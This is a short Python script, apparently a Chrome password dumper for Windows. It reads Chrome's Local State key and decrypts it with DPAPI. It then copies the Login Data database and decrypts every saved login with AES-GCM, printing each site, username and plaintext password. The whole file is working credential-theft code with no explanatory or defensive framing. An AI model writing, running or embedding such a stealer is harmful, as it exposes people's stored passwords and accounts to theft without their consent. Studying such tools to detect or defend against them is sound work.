import base64
import win32crypt
from os import getenv
import sqlite3
import json
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from shutil import copyfile

def decrptPass():
	Localstate = getenv("LocalAppData")+"\\Google\\Chrome\\User Data\\Local State"
	with open(Localstate,"r") as f:
		content = f.read()
		key = json.loads(content)['os_crypt']['encrypted_key']		

	a = base64.b64decode(key)
	
	originkey = win32crypt.CryptUnprotectData(a[5::], None, None, None, 0)[1]

	copyfile(getenv("LocalAppData") + "\\Google\\Chrome\\User Data\\Default\\Login Data","tmp_Login_Data")
	conn = sqlite3.connect("tmp_Login_Data")
	cursor = conn.cursor()
	cursor.execute('SELECT action_url, username_value, password_value FROM logins')
	for result in cursor.fetchall():
		iv = result[2][3:15]
		enctext = result[2][15:]

		aesgcm=AESGCM(originkey)
		plaintext = aesgcm.decrypt(iv,enctext,None).decode('utf-8')

		url = result[0]
		username = result[1]

		if not url and not username:
			pass
		else:
			print(url+","+username+","+plaintext)


if __name__ == '__main__':
	decrptPass()
